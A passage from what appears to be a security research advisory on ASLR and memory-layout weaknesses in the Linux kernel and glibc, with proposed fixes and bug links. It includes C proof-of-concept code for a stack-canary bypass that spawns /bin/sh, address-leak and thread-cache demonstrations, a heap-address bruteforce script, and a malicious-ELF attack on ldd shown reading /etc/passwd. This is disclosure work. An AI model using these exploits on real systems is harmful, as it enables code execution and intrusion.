Subtracting a certain constant value from TLS, we obtain the value used by =
a=20
new thread for the stack register. The distance from TLS to the stack frame=
 of=20
the function that the argument passed to pthread_create is less than one pa=
ge.=20
Now a would-be attacker does not need to guess or peek at the canary value=
=E2=80=94the=20
attacker can just overwrite the reference value alongside with the stack va=
lue,=20
bypassing protection entirely. A similar problem was found in Intel ME [14].

Here is Proof Of Concept:

void pwn_payload() {
    char *argv[2] =3D {"/bin/sh", 0};
    execve(argv[0], argv, 0);
}

int fixup =3D 0;
void * first(void *x)
{
    unsigned long *addr;
    arch_prctl(ARCH_GET_FS, &addr);
    printf("thread FS %p\n", addr);
    printf("cookie thread: 0x%lx\n", addr[5]);
    unsigned long * frame =3D __builtin_frame_address(0);
    printf("stack_cookie addr %p \n", &frame[-1]);
    printf("diff : %lx\n", (char*)addr - (char*)&frame[-1]);=20
    unsigned long len =3D(unsigned long)( (char*)addr - (char*)&frame[-1]) =
+=20
fixup;
    // example of exploitation
    // prepare exploit
    void *exploit =3D malloc(len);
    memset(exploit, 0x41, len);
    void *ptr =3D &pwn_payload;
    memcpy((char*)exploit + 16, &ptr, 8);
    // exact stack-buffer overflow example
    memcpy(&frame[-1], exploit, len);
    return 0;
}

int main(int argc, char **argv, char **envp)
{
    pthread_t one;
    unsigned long *addr;
    void *val;
    arch_prctl(ARCH_GET_FS, &addr);
    if (argc > 1)
        fixup =3D 0x30;
    printf("main FS %p\n", addr);
    printf("cookie main: 0x%lx\n", addr[5]);
    pthread_create(&one, NULL, &first, 0);
    pthread_join(one,&val);
    return 0;
}

And running it:

blackzert@crasher:~/aslur/tests$ ./thread_stack_tls  1
main FS 0x7f4d94b75700
cookie main: 0x2ad951d602d94100
thread FS 0x7f4d94385700
cookie thread: 0x2ad951d602d94100
stack_cookie addr 0x7f4d94384f48
diff : 7b8
$ ^D
blackzert@crasher:~/aslur/tests$

`Diff` here is a size in bytes between current stack frame and TCB structur=
e.=20
This one equals to 0x7b8 bytes what is one page less.=20
The protection against buffer overflow could be bypassed by buffer overflow.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.6. malloc and mmap
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

When using malloc, sometimes glibc uses mmap for allocating new memory area=
s if=20
the size of requested memory is larger than a certain value. In such cases,=
=20
memory will be allocated with the help of mmap, so, after memory allocation=
,=20
the address will be close to libraries or other data allocated with mmap.=20
Attackers pay close attention to mistakes in handling of heap objects, such=
 as=20
heap overflow, use after free [15], and type confusion [5].=20

An interesting behavior of the glibc library was found when a program uses=
=20
pthread_create. At the first call of malloc from the thread created with=20
pthread_create, glibc will call mmap to create a new heap for this stack. S=
o,=20
in this thread, all the addresses called via malloc will be located close t=
o=20
the stack of this same thread.

Some programs and libraries use mmap for mapping files to the address space=
 of=20
a process. The files may be used as, for example, cache or for fast saving=
=20
(altering) of data on the drive.=20

Here is an abstract example: an application loads an MP3 file with the help=
 of=20
mmap. Let us call the load address mmap_mp3. Then the application reads, fr=
om=20
the loaded data, the offset to the start of audio data. If the application=
=20
contains a mistake in its routine for verifying the length of that value, a=
n=20
attacker may specially craft an MP3 file able to obtain access to the memor=
y=20
region located after mmap_mp3.=20

Some PoC code:

int main(int argc, char **argv, char **envp)
{
    int res;
    system(""); // call to make lazy linking
    execv("", NULL); // call to make lazy linking
    unsigned long  addr =3D (unsigned long)mmap(0, 8 * 4096 *4096, 3, MAP_A=
NON |=20
MAP_PRIVATE, -1, 0);
    if (addr =3D=3D MAP_FAILED)
        return -1;
    unsigned long addr_system =3D (unsigned long)dlsym(RTLD_NEXT, "system");
    unsigned long addr_execv =3D (unsigned long)dlsym(RTLD_NEXT, "execv");
    printf("addr %lx system %lx execv %lx\n", addr, addr_system, addr_execv=
);
    printf("system - addr %lx execv - addr %lx\n", addr_system - addr,=20
addr_execv - addr);
    return 0;
}

And results:
blackzert@crasher:~/aslur/tests$ ./mmap_libc=20
addr 7f02e9f85000 system 7f02f1fca390 execv 7f02f2051860
system - addr 8045390 execv - addr 80cc860

This shows constant offsets to library data from mmapped segment (malloced =
as=20
well).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.7. MAP_FIXED and loading of ET_DYN ELF files
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The mmap manual says the following regarding the MAP_FIXED flag:=20

MAP_FIXED=20

  Don't interpret addr as a hint: place the mapping at exactly that address=
.=20
addr must be a multiple of the page size. If the memory region specified by=
=20
addr and len overlaps pages of any existing mapping(s), then the overlapped=
=20
part of the existing mapping(s) will be discarded. If the specified address=
=20
cannot be used, mmap() will fail. Because requiring a fixed address for a=20
mapping is less portable, the use of this option is discouraged.=20

If the requested region with the MAP_FIXED flag overlaps existing regions,=
=20
successful mmap execution will overwrite existing regions.=20

Therefore, if a programmer makes a mistake with MAP_FIXED, existing memory=
=20
regions may be redefined.=20

An interesting example of such a mistake has been found both in the Linux=20
kernel and in glibc.=20
As described in [16], ELF files are subject to the requirement that, in the=
=20
Phdr header, ELF file segments must be arranged in ascending order of vaddr=
=20
addresses:=20

PT_LOAD=20

  The array element specifies a loadable segment, described by p_filesz and=
=20
p_memsz. The bytes from the file are mapped to the start of the memory segm=
ent.=20
If the segment's memory size (p_memsz) is larger than the file size (p_file=
sz),=20
the "extra" bytes are defined to hold the value 0 and to follow the segment=
's=20
initialized area. The file size may not be larger than the memory size.=20
Loadable segment entries in the program header table appear in ascending or=
der,=20
sorted on the p_vaddr member.=20

However, this requirement is not checked. The current code for ELF file loa=
ding=20
is as follows:=20

  case PT_LOAD:
      struct loadcmd *c =3D &loadcmds[nloadcmds++];
      c->mapstart =3D ALIGN_DOWN (ph->p_vaddr, GLRO(dl_pagesize));
      c->mapend =3D ALIGN_UP (ph->p_vaddr + ph->p_filesz, GLRO(dl_pagesize)=
);
  ...
  maplength =3D loadcmds[nloadcmds - 1].allocend - loadcmds[0].mapstart;
  ...
  for (const struct loadcmd *c =3D loadcmds; c < &loadcmds[nloadcmds]; ++c)
  ...
  /* Map the segment contents from the file.  */
  if (__glibc_unlikely (__mmap ((void *) (l->l_addr + c->mapstart),
                    maplen, c->prot,
                    MAP_FIXED|MAP_COPY|MAP_FILE,
                    fd, c->mapoff)


All segments are processed according to the following algorithm:=20

  1. Calculate the size of the loaded ELF file: the address of the end of t=
he=20
last segment end, minus the start address of the first segment.
  2. With the help of mmap, allocate memory for the entire ELF file with th=
at=20
size, thus obtaining the base address for ELF file loading.
  3. In the case of glibc, change access rights. If loading from the kernel=
,=20
release regions that create holes. Here the behavior of glibc and the Linux=
=20
kernel differ, as described in Section 4.4.
  4. With the help of mmap and the MAP_FIXED flag, allocate memory for=20
remaining segments by using the address obtained by isolating the first seg=
ment=20
and adding the offset obtained from the ELF file header.

This enables an intruder to create an ELF file, one of whose segments can f=
ully=20
overwrite an existing memory region=E2=80=94such as the thread stack, heap,=
 or library=20
code.=20

An example of a vulnerable application is the ldd tool, which is used to ch=
eck=20
whether required libraries are present in the system:

blackzert@crasher:~/aslur/tests/evil_elf$ ldd ./main
    linux-vdso.so.1 =3D>  (0x00007ffc48545000)
    libevil.so =3D> ./libevil.so (0x00007fbfaf53a000)
    libc.so.6 =3D> /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbfaf14d000)
    /lib64/ld-linux-x86-64.so.2 (0x000055dda45e6000)

The tool uses the ld interpreter. Taking advantage of the problem with ELF =
file=20
loading just discussed, we succeeded in executing arbitrary code with ldd:=
=20

blackzert@crasher:~/aslur/tests/evil_elf$ ldd ./main
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
blackzert@crasher:~/aslur/tests/evil_elf$

The issue of MAP_FIXED has also been raised in the Linux community previous=
ly=20
[17].

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.8. Cache of allocated memory
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

glibc has many different caches, of which two are interesting in the contex=
t of=20
ASLR: the cache for the stack of a newly created thread and the heap stack.=
 The=20
stack cache works as follows: on thread termination, stack memory will not =
be=20
released but will be transferred to the corresponding cache. When creating =
a=20
thread stack, glibc first checks the cache. If the cache contains a region =
of=20
the required length, glibc uses that region. In this case, mmap will not be=
=20
accessed, and the new thread will use the previously used region with the s=
ame=20
addresses. If the attacker has successfully obtained the thread stack addre=
ss,=20
and can control creation and deletion of program threads, the intruder can =
use=20
knowledge of the address for vulnerability exploitation. Further, if the=20
application contains uninitialized variables, their values can also be subj=
ect=20
to the attacker's control, which may lead to exploitation in some cases.=20

The heap cache works as follows: on thread termination, its heap moves to t=
he=20
corresponding cache. When a heap is created again for a new thread, the cac=
he=20
is checked first. If the cache has an available region, this region will be=
=20
used. In this case, everything about the stack in the previous paragraph=20
applies here as well.=20

Here is PoC:

void * func(void *x)
{
    long a[1024];
    printf("addr: %p\n", &a[0]);
    if (x)
        printf("value %lx\n", a[0]);
    else
    {
        a[0] =3D 0xdeadbeef;
        printf("value %lx\n", a[0]);
    }
    void * addr =3D malloc(32);
    printf("malloced %p\n", addr);
    free(addr);
    return 0;
}

int main(int argc, char **argv, char **envp)
{
    int val;
    pthread_t thread;
    printf("thread1\n");
    pthread_create(&thread, NULL, func, 0);
    pthread_join(thread, &val);
    printf("thread2\n");
    pthread_create(&thread, NULL, func, 1);
    pthread_join(thread, &val);
    return 0;
}

blackzert@crasher:~/aslur/tests$ ./pthread_cache=20
thread1
addr: 0x7fd035e04f40
value deadbeef
malloced <b>0x7fd030000cd0
thread2
addr: 0x7fd035e04f40
value deadbeef
malloced 0x7fd030000cd0

As clearly seen, the addresses of local variables in the stack for=20
consecutively created threads remain the same. Also the same are the addres=
ses=20
of variables allocated for them via malloc; some values of the first thread=
's=20
local variables are still accessible to the second thread. An attacker can =
use=20
this to exploit vulnerabilities of uninitialized variables [18]. Although t=
he=20
cache speeds up the application, it also enables attackers to bypass ASLR a=
nd=20
carry out exploitation.=20


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
II.9. thread cache alignment
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Let us now create a thread, allocate some memory with malloc, and calculate=
 the=20
difference from the local variable in this thread. Source code:

void * first(void *x)
{
        int a =3D (int)x;
        int *p_a =3D &a;
    void *ptr;
        ptr =3D malloc(8);
    printf("%lx\n%p, %p\n", (unsigned long long)ptr - (unsigned long long)p=
_a,=20
ptr, p_a);
        return 0;
}

int main()
{
        pthread_t one;
        pthread_create(&one, NULL, &first, 0);
        void *val;
        pthread_join(one,&val);
        return 0;
}

The first launch:=20

blackzert@crasher:~/aslur/tests$ ./thread_stack_small_heap
fffffffff844e98c
0x7f20480008c0, 0x7f204fbb1f34

And the second launch:

blackzert@crasher:~/aslur/tests$ ./thread_stack_small_heap
fffffffff94a598c
0x7fa3140008c0, 0x7fa31ab5af34

In this case, the difference was not the same. Nor will it remain the same =
from=20
launch to launch. Let us consider the reasons for this.


The first thing to note: the malloc-derived pointer address does not corres=
pond=20
to the process heap address.=20

glibc creates a new heap for each new thread created with the help of=20
pthread_create. The pointer to this heap lies in TLS, so any thread allocat=
es=20
memory from its own heap, which increases performance, since there is no ne=
ed=20
to sync threads in case of concurrent malloc use.=20
But why then is the address "random"?=20

When allocating a new heap, glibc uses mmap; the size depends on the=20
configuration. In this case, the heap size is 64 MB. The heap start address=
=20
must be aligned to 64 MB. So the system first allocates 128 MB and then ali=
gns=20
a piece of 64 MB in this range while unaligned pieces are released and crea=
te a=20
"hole" between the heap address and the closest region that was previously=
=20
allocated with mmap.=20
Randomness is brought about by the kernel itself when selectingmmap_based: =
this=20
address is not aligned to 64 MB, as were the mmap memory allocations before=
 the=20
call of the malloc in question.=20
Regardless of why address alignment is required, this leads to a very=20
interesting effect: bruteforcing becomes possible.=20

The Linux kernel defines the process address space for x86-64 as "48 bits m=
inus=20
one guard page", which for simplicity we will round to 2^48 (omitting the=20
one-page subtraction in our size calculations). 64 MB is 2^26, so the=20
significant bits equal 48 =E2=80=93 26 =3D 22, giving us a total of 2^22 va=
rious heaps of=20
secondary threads.=20

This substantially narrows the bruteforcing range.=20

Because the mmap address is selected in a known way, we can assume that the=
=20
heap of the first thread created with pthread_create will be selected as 64=
 MB=20
close to the upper address range. To be more precise, it will be close to a=
ll=20
the loaded libraries, loaded files, and so on.=20
In some cases, it is possible to calculate the total amount of memory alloc=
ated=20
before the call to the malloc in question. In our case, we loaded only glib=
c=20
and ld and created a stack for the thread. So this value is small.=20

mmap_base is selected with an entropy of 28 to 32 bits depending on kernel=
=20
settings at compile time (28 bits by default). So some top boundary is set =
off=20
by that same amount.=20
Thus, in many cases, the upper 8 bits of the address will equal 0x7f, while=
 in=20
rare cases, they will be 0x7e. That gives us another 8 bits of certainty. T=
here=20
are a total of 2^14 possible options for selecting a heap for the first thr=
ead.=20
The more threads are created, the lesser that value is for the next heap=20
selection.

Let us illustrate this behavior with the following C code:

void * first(void *x)
{
    int a =3D (int)x;
    void *ptr;
    ptr =3D malloc(8);
    printf("%p\n", ptr );
    return 0;
}

int main()
{
    pthread_t one;
    pthread_create(&one, NULL, &first, 0);
    void *val;
    pthread_join(one,&val);
    return 0;
}

Then let us launch the program a sufficient number of times with Python cod=
e=20
for collecting address statistics:

import subprocess
d =3D {}
def dump(iteration, hysto):
    print 'Iteration %d len %d'%(iteration, len(hysto))
    for key in sorted(hysto):
        print hex(key), hysto[key]
i =3D 0
while i < 1000000:
    out =3D subprocess.check_output(['./t'])
    addr =3D int(out, 16)
    #omit page size
    addr >>=3D 12
    if addr in d:
        d[addr] +=3D 1
    else:
        d[addr] =3D 1
    i +=3D 1
dump(i,d)

This code launches the simple './t' program, which creates a new thread, a=
=20
sufficient number of times.
The code allocates a buffer with the help of malloc and displays the buffer=
=20
address. Once the program has completed this, the address is read and the=20
program calculates how many times the address was encountered during operat=
ion=20
of the program. The script collects a total of 16,385 different addresses,=
=20
which equals 2^14+1. This is the number of attempts an attacker could make,=
 in=20
the worst case, to guess the heap address of the program in question.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
III. Solutions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In this article, we have reviewed several problems - some of them attended =
to=20
Linux Kernel, some to GNU Libc; now we can consider fixes for Linux Kernel=
=20
problems. You may track GNU Libc issues by following links:

  - Stack protector easy to bypass=20
https://sourceware.org/bugzilla/show_bug.cgi?id=3D22850=20
  - ld library ELF load error=20=20
https://sourceware.org/bugzilla/show_bug.cgi?id=3D22851
  - Thread stack and heap caches=20
https://sourceware.org/bugzilla/show_bug.cgi?id=3D22852
  - Heap address of pthread_create thread is aligned=20
https://sourceware.org/bugzilla/show_bug.cgi?id=3D22853

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
III.1 Holes
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

As shown in Section II.4, the ELF interpreter loader in the Linux kernel=20
contains an error and allows releasing part of the interpreter library memo=
ry.=20
A relevant fix was proposed to the community, but was neglected without act=
ion:=20

https://lkml.org/lkml/2017/7/14/290

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
III.2 Order of loading ELF file segments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

As noted above, in the kernel and in the code of the glibc library, there i=
s no=20
checking of file ELF segments: the code simply trusts that they are in the=
=20
correct order. Proof-of-concept code, as well as a fix, is enclosed:=20
https://github.com/blackzert/aslur=20

The fix is quite simple: we go through the segments and ensure that the cur=
rent=20
one does not overlap the next one, and that the segments are sorted in the=
=20
ascending order of vaddr.=20

https://lkml.org/lkml/2018/2/26/571

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
III.3 Use of mmap_min_addr when searching for mmap allocation addresses
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

As soon as a fix was written for mmap, in order to return addresses with=20
sufficient entropy, a problem arose: some mmap calls failed with an access=
=20
permission error. This happened even as root or when requested by the kerne=
l=20
when executing execve.=20

In the address selection algorithm (described earlier in Introduction), one=
 of=20
the listed options is checking addresses for security restrictions. In the=
=20
current implementation, this check verifies that the selected address is la=
rger=20
than mmap_min_addr. This is a system variable that can be changed by an=20
administrator through sysctl. The system administrator can set any value, a=
nd=20
the process cannot allocate a page at an address less than this value. The=
=20
default value is 65536.=20

The problem was that when the address function for mmap was called on x86-6=
4,=20
the Linux kernel used 4096 as the value of the minimal lower boundary, whic=
h is=20
less than the value of mmap_min_addr. The function cap_mmap_addr forbids th=
is=20
operation if the selected address falls between 4096 and mmap_min_addr.=20

cap_mmap_addr is called implicitly; this function is registered as a hook f=
or=20
security checking. This architectural solution raises questions: first, we=
=20
choose the address without having the ability to test it with external=20
criteria, and then we check its permissibility in accordance with the curre=
nt=20
system parameters. If the address does not pass the check, then even if the=
=20
address is selected by the kernel, it can be "forbidden" and the entire=20
operation will end with the EPERM error.=20

An attacker can use this fact to cause denial of service in the entire syst=
em:=20
if the attacker can specify a very large value, no user process can start i=
n=20
the system. Moreover, if the attacker manages to store this value in the sy=
stem=20
parameters, then even rebooting will not help=E2=80=94all created processes=
 will be=20
terminated with the EPERM error.=20

Currently, the fix is to use the mmap_min_addr value as the lowest allowabl=
e=20
address when making a request to the address search function. Such code is=
=20
already used for all other architectures.=20
What will happen if the system administrator starts changing this value on =
a=20
running machine? This question remains unanswered, since all new allocation=
s=20
after the change may end with the EPERM error; no program code expects such=
 an=20
error and does not know what to do with it. The mmap documentation states t=
he=20
following:=20

"EPERM The operation was prevented by a file seal; see fcntl (2)."=20

That is to say, the kernel cannot return EPERM to MAP_ANONYMOUS, although i=
n=20
fact that is not so.=20
=20=20
https://lkml.org/lkml/2018/2/26/1053

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
III.4 mmap
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The main mmap problem discussed here is the lack of entropy in address choi=
ce.=20
Ideally, the logical fix would be to select memory randomly. To select it=20
randomly, one must first build a list of all free regions of appropriate si=
ze=20
and then, from that list, select a random region and an address from this=20
region that meets the search criteria (the length of the requested region a=
nd=20
the allowable lower and upper boundaries).=20

To implement this logic, the following approaches can be applied:=20

  1. Keep the list of voids in a descending-order array. In this case, the=
=20
choice of random element is made in a single operation, but maintaining thi=
s=20
array requires many operations for releasing (allocating) the memory when t=
he=20
current virtual address space map of the process changes.=20
  2. Keep the list of voids in a tree and a list, in order to find an outer=
=20
boundary that satisfies the length requirement, and select a random element=
=20
from the array. If the element does not fit the minimum/maximum address=20
restrictions, select the next one, and so on until one is found (or none=20
remain). This approach involves complex list and tree structures similar to=
=20
those already existing for vma with regard to change of address space.=20
  3. Use the existing structure of the augmented red-black vma tree to bypa=
ss=20
the list of allowed gap voids and select a random address. In the worst cas=
e,=20
each choice will have to bypass all the peaks, but rebuilding the tree does=
 not=20
incur any additional slowdown of performance.=20

Our choice went to the last approach. We can use the existing vma=20
organizational structure without adding redundancy and select an address us=
ing=20
the following algorithm:=20
  1. Use the existing algorithm to find a possible gap void with the larges=
t=20
valid address. Also, record the structure of vma following it. If there is =
no=20
such structure, return ENOMEM.=20
  2. Record the found gap as the result and vma as the maximum upper bounda=
ry.=20
  3. Take the first vma structure from the doubly linked list. It will be a=
=20
leaf in the red-black tree, because it has the smallest address.=20
  4. Make a left-hand traversal of the tree from the selected vma, checking=
 the=20
permissibility of the free region between the vma in question and its=20
predecessor. If the free region is allowed by the restrictions, obtain anot=
her=20
bit of entropy. If the entropy bit is 1, redefine the current value of the =
gap=20
void.=20
  5. Return a random address from the selected gap void region.=20
  One way to optimize the fourth step of the algorithm is not to enter subt=
rees=20
whose gap extension size is smaller than the required length.=20

This algorithm selects an address with sufficient entropy, although it is=20
slower than the current implementation.=20

As far as obvious drawbacks, it is necessary to bypass all vma structures t=
hat=20
have a sufficient gap void length. However, this is offset by the absence o=
f=20
any performance slowdown when changing address space.

Here is the output of `less /proc/self/maps` after the patch:

314a2d0da000-314a2d101000 r-xp /lib/x86_64-linux-gnu/ld-2.26.so
314a2d301000-314a2d302000 r--p /lib/x86_64-linux-gnu/ld-2.26.so
314a2d302000-314a2d303000 rw-p /lib/x86_64-linux-gnu/ld-2.26.so
314a2d303000-314a2d304000 rw-p=20

3169afcd8000-3169afcdb000 rw-p=20

316a94aa1000-316a94ac6000 r-xp /lib/x86_64-linux-gnu/libtinfo.so.5.9
316a94ac6000-316a94cc5000 ---p /lib/x86_64-linux-gnu/libtinfo.so.5.9
316a94cc5000-316a94cc9000 r--p /lib/x86_64-linux-gnu/libtinfo.so.5.9
316a94cc9000-316a94cca000 rw-p /lib/x86_64-linux-gnu/libtinfo.so.5.9

3204e362d000-3204e3630000 rw-p=20

4477fff2c000-447800102000 r-xp /lib/x86_64-linux-gnu/libc-2.26.so
447800102000-447800302000 ---p /lib/x86_64-linux-gnu/libc-2.26.so
447800302000-447800306000 r--p /lib/x86_64-linux-gnu/libc-2.26.so
447800306000-447800308000 rw-p /lib/x86_64-linux-gnu/libc-2.26.so
447800308000-44780030c000 rw-p=20

509000396000-509000d60000 r--p /usr/lib/locale/locale-archive

56011c1b1000-56011c1d7000 r-xp /bin/less
56011c3d6000-56011c3d7000 r--p /bin/less
56011c3d7000-56011c3db000 rw-p /bin/less
56011c3db000-56011c3df000 rw-p=20

56011e0d8000-56011e0f9000 rw-p [heap]

7fff6b4a4000-7fff6b4c5000 rw-p [stack]
7fff6b53b000-7fff6b53e000 r--p [vvar]
7fff6b53e000-7fff6b540000 r-xp [vdso]
ffffffffff600000-ffffffffff601000 r-xp [vsyscall]=20

https://lkml.org/lkml/2018/2/27/267

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
IV. Related Work
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The problem with current mmap behavior was also found by other researches:

